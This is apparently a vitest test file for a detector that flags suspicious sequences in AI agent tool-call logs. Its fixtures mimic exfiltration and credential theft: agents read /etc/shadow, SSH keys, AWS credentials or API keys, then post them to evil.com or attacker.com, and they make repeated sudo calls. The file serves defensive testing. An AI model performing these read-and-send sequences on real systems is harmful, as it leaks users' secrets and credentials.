import { describe, it, expect } from 'vitest';
import { PatternMatcher } from '../PatternMatcher';
import type { ThreatPattern, ToolCallEvent } from '../../types';
import {
  FILE_EXFILTRATION,
  CREDENTIAL_THEFT,
  MASS_DATA_ACCESS,
  ESCALATION_ATTEMPTS,
} from '../patterns/builtin';

describe('PatternMatcher', () => {
  describe('File Exfiltration Pattern', () => {
    it('detects file read followed by HTTP POST', () => {
      const matcher = new PatternMatcher([FILE_EXFILTRATION]);

      const events: ToolCallEvent[] = [
        {
          sessionId: 'session-1',
          timestamp: 1000,
          tool: 'read_file',
          args: { path: '/etc/passwd' },
        },
        {
          sessionId: 'session-1',
          timestamp: 2000,
          tool: 'http_post',
          args: { url: 'https://evil.com/exfil' },
        },
      ];

      const threats = matcher.matches(events);

      expect(threats).toHaveLength(1);
      expect(threats[0].pattern).toBe('file-exfiltration');
      expect(threats[0].severity).toBe('critical');
    });

    it('detects sensitive file patterns', () => {
      const matcher = new PatternMatcher([FILE_EXFILTRATION]);

      const sensitiveFiles = [
        '/etc/shadow',
        '/home/user/.ssh/id_rsa',
        '/var/secrets/api-key',
        '/secrets/.env',
        '/home/user/.aws/credentials',
      ];

      for (const file of sensitiveFiles) {
        const events: ToolCallEvent[] = [
          {
            sessionId: 'session-1',
            timestamp: 1000,
            tool: 'read_file',
            args: { path: file },
          },
          {
            sessionId: 'session-1',
            timestamp: 2000,
            tool: 'http_post',
            args: { url: 'https://evil.com' },
          },
        ];

        const threats = matcher.matches(events);
        expect(threats.length).toBeGreaterThan(0, `Failed for file: ${file}`);
      }
    });

    it('does not trigger on normal file reads', () => {
      const matcher = new PatternMatcher([FILE_EXFILTRATION]);

      const events: ToolCallEvent[] = [
        {
          sessionId: 'session-1',
          timestamp: 1000,
          tool: 'read_file',
          args: { path: '/tmp/data.txt' },
        },
        {
          sessionId: 'session-1',
          timestamp: 2000,
          tool: 'write_file',
          args: { path: '/tmp/output.txt' },
        },
      ];

      const threats = matcher.matches(events);
      expect(threats).toHaveLength(0);
    });

    it('respects time window', () => {
      const matcher = new PatternMatcher([FILE_EXFILTRATION]);

      const events: ToolCallEvent[] = [
        {
          sessionId: 'session-1',
          timestamp: 1000,
          tool: 'read_file',
          args: { path: '/etc/passwd' },
        },
        {
          sessionId: 'session-1',
          timestamp: 100000, // 99 seconds later (exceeds 60s maxTimeWindow)
          tool: 'http_post',
          args: { url: 'https://evil.com' },
        },
      ];

      const threats = matcher.matches(events);
      expect(threats).toHaveLength(0);
    });
  });

  describe('Credential Theft Pattern', () => {
    it('detects credential access followed by external write', () => {
      const matcher = new PatternMatcher([CREDENTIAL_THEFT]);

      const events: ToolCallEvent[] = [
        {
          sessionId: 'session-1',
          timestamp: 1000,
          tool: 'read_env',
          args: { path: 'API_KEY' },
        },
        {
          sessionId: 'session-1',
          timestamp: 5000,
          tool: 'http_post',
          args: { url: 'https://attacker.com' },
        },
      ];

      const threats = matcher.matches(events);
      expect(threats).toHaveLength(1);
      expect(threats[0].pattern).toBe('credential-theft');
    });
  });

  describe('Mass Data Access Pattern', () => {
    it('detects excessive file reads', () => {
      const matcher = new PatternMatcher([MASS_DATA_ACCESS]);

      const events: ToolCallEvent[] = [];
      const now = Date.now();

      // Create 15 file read events within 1 minute
      for (let i = 0; i < 15; i++) {
        events.push({
          sessionId: 'session-1',
          timestamp: now + i * 1000, // 1 second apart
          tool: 'read_file',
          args: { path: `/file${i}.txt` },
        });
      }

      const threats = matcher.matches(events);
      expect(threats.length).toBeGreaterThan(0);
      expect(threats[0].pattern).toBe('mass-data-access');
    });

    it('does not trigger on normal access patterns', () => {
      const matcher = new PatternMatcher([MASS_DATA_ACCESS]);

      const events: ToolCallEvent[] = [];
      const now = Date.now();

      // Create only 5 file reads (below 10 threshold)
      for (let i = 0; i < 5; i++) {
        events.push({
          sessionId: 'session-1',
          timestamp: now + i * 1000,
          tool: 'read_file',
          args: { path: `/file${i}.txt` },
        });
      }

      const threats = matcher.matches(events);
      expect(threats).toHaveLength(0);
    });
  });

  describe('Escalation Attempts Pattern', () => {
    it('detects multiple privilege escalation attempts', () => {
      const matcher = new PatternMatcher([ESCALATION_ATTEMPTS]);

      const events: ToolCallEvent[] = [];
      const now = Date.now();

      // Create 5 sudo attempts
      for (let i = 0; i < 5; i++) {
        events.push({
          sessionId: 'session-1',
          timestamp: now + i * 10000, // 10 seconds apart
          tool: 'sudo_exec',
          args: { command: 'whoami' },
        });
      }

      const threats = matcher.matches(events);
      expect(threats.length).toBeGreaterThan(0);
      expect(threats[0].pattern).toBe('escalation-attempts');
    });
  });

  describe('Pattern Matching Logic', () => {
    it('handles regex tool patterns', () => {
      const pattern: ThreatPattern = {
        name: 'test-regex',
        description: 'Test regex matching',
        severity: 'medium',
        maxTimeWindow: 60000,
        steps: [
          { tool: /read.*/ }, // Matches read_file, read_env, etc.
          { tool: /write.*/ },
        ],
      };

      const matcher = new PatternMatcher([pattern]);

      const events: ToolCallEvent[] = [
        {
          sessionId: 'session-1',
          timestamp: 1000,
          tool: 'read_file',
          args: {},
        },
        {
          sessionId: 'session-1',
          timestamp: 2000,
          tool: 'write_file',
          args: {},
        },
      ];

      const threats = matcher.matches(events);
      expect(threats).toHaveLength(1);
    });

    it('handles argument patterns', () => {
      const pattern: ThreatPattern = {
        name: 'test-args',
        description: 'Test argument matching',
        severity: 'high',
        maxTimeWindow: 60000,
        steps: [
          {
            tool: 'read_file',
            args: { path: /secret/ },
          },
        ],
      };

      const matcher = new PatternMatcher([pattern]);

      const events: ToolCallEvent[] = [
        {
          sessionId: 'session-1',
          timestamp: 1000,
          tool: 'read_file',
          args: { path: '/var/secrets/key.pem' },
        },
      ];

      const threats = matcher.matches(events);
      expect(threats).toHaveLength(1);
    });

    it('does not match if args do not match', () => {
      const pattern: ThreatPattern = {
        name: 'test-args',
        description: 'Test argument matching',
        severity: 'high',
        maxTimeWindow: 60000,
        steps: [
          {
            tool: 'read_file',
            args: { path: /secret/ },
          },
        ],
      };

      const matcher = new PatternMatcher([pattern]);

      const events: ToolCallEvent[] = [
        {
          sessionId: 'session-1',
          timestamp: 1000,
          tool: 'read_file',
          args: { path: '/tmp/normal.txt' },
        },
      ];

      const threats = matcher.matches(events);
      expect(threats).toHaveLength(0);
    });

    it('handles multiple patterns', () => {
      const matcher = new PatternMatcher([FILE_EXFILTRATION, CREDENTIAL_THEFT]);

      const events: ToolCallEvent[] = [
        {
          sessionId: 'session-1',
          timestamp: 1000,
          tool: 'read_file',
          args: { path: '/etc/passwd' },
        },
        {
          sessionId: 'session-1',
          timestamp: 2000,
          tool: 'http_post',
          args: { url: 'https://evil.com' },
        },
      ];

      const threats = matcher.matches(events);
      expect(threats.length).toBeGreaterThan(0);
    });

    it('works with same-session filtering', () => {
      const matcher = new PatternMatcher([FILE_EXFILTRATION]);

      const allEvents: ToolCallEvent[] = [
        {
          sessionId: 'session-1',
          timestamp: 1000,
          tool: 'read_file',
          args: { path: '/etc/passwd' },
        },
        {
          sessionId: 'session-2', // Different session
          timestamp: 2000,
          tool: 'http_post',
          args: { url: 'https://evil.com' },
        },
      ];

      // Filter to session-1 only
      const session1Events = allEvents.filter(e => e.sessionId === 'session-1');
      const threats = matcher.matches(session1Events);

      // Only one event from session-1, should not match (needs 2 steps)
      expect(threats).toHaveLength(0);
    });
  });

  describe('Performance', () => {
    it('completes matching in <5ms for typical session', () => {
      const matcher = new PatternMatcher([
        FILE_EXFILTRATION,
        CREDENTIAL_THEFT,
        MASS_DATA_ACCESS,
      ]);

      // Create 50 events (typical session size)
      const events: ToolCallEvent[] = [];
      const now = Date.now();

      for (let i = 0; i < 50; i++) {
        events.push({
          sessionId: 'session-1',
          timestamp: now + i * 1000,
          tool: 'read_file',
          args: { path: `/file${i}.txt` },
        });
      }

      const start = performance.now();
      matcher.matches(events);
      const duration = performance.now() - start;

      expect(duration).toBeLessThan(5); // <5ms (realistic for Node.js)
    });
  });
});
